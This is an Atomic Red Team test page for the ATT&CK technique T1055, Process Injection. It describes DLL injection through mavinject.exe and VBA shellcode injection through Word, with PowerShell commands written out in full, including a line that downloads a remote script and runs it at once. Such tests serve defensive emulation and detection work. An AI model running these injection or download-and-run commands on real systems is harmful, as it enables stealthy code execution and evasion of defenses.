# T1055 - Process Injection
## [Description from ATT&CK](https://attack.mitre.org/techniques/T1055)
<blockquote>Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. 

There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. 

More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. </blockquote>

## Atomic Tests

- [Atomic Test #1 - Process Injection via mavinject.exe](#atomic-test-1---process-injection-via-mavinjectexe)

- [Atomic Test #2 - Shellcode execution via VBA](#atomic-test-2---shellcode-execution-via-vba)


<br/>

## Atomic Test #1 - Process Injection via mavinject.exe
Windows 10 Utility To Inject DLLS.

Upon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.
With default arguments, expect to see a MessageBox, with notepad's icon in taskbar.

**Supported Platforms:** Windows




#### Inputs:
| Name | Description | Type | Default Value | 
|------|-------------|------|---------------|
| process_id | PID of input_arguments | Integer | (Start-Process notepad -PassThru).id|
| dll_payload | DLL to Inject | Path | PathToAtomicsFolder&#92;T1055&#92;src&#92;x64&#92;T1055.dll|


#### Attack Commands: Run with `powershell`!  Elevation Required (e.g. root or admin) 


```powershell
$mypid = #{process_id}
mavinject $mypid /INJECTRUNNING #{dll_payload}
```




#### Dependencies:  Run with `powershell`!
##### Description: Utility to inject must exist on disk at specified location (#{dll_payload})
##### Check Prereq Commands:
```powershell
if (Test-Path #{dll_payload}) {exit 0} else {exit 1} 
```
##### Get Prereq Commands:
```powershell
New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055.dll" -OutFile "#{dll_payload}"
```

## Atomic Test #2 - Shellcode execution via VBA
This module injects shellcode into a newly created process and executes. By default the shellcode is created,
with Metasploit, for use on x86-64 Windows 10 machines.

Note: Due to the way the VBA code handles memory/pointers/injection, a 64bit installation of Microsoft Office
is required.

**Supported Platforms:** Windows





#### Attack Commands: Run with `powershell`! 


```powershell
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1055\src\x64\T1055-macrocode.txt" -officeProduct "Word" -sub "Execute"
```




#### Dependencies:  Run with `powershell`!
##### Description: The 64-bit version of Microsoft Office must be installed
##### Check Prereq Commands:
```powershell
try {
  $wdApp = New-Object -COMObject "Word.Application"
  $path = $wdApp.Path
  Stop-Process -Name "winword"
  if ($path.contains("(x86)")) { exit 1 } else { exit 0 }
} catch { exit 1 } 
```
##### Get Prereq Commands:
```powershell
Write-Host "You will need to install Microsoft Word (64-bit) manually to meet this requirement"
```
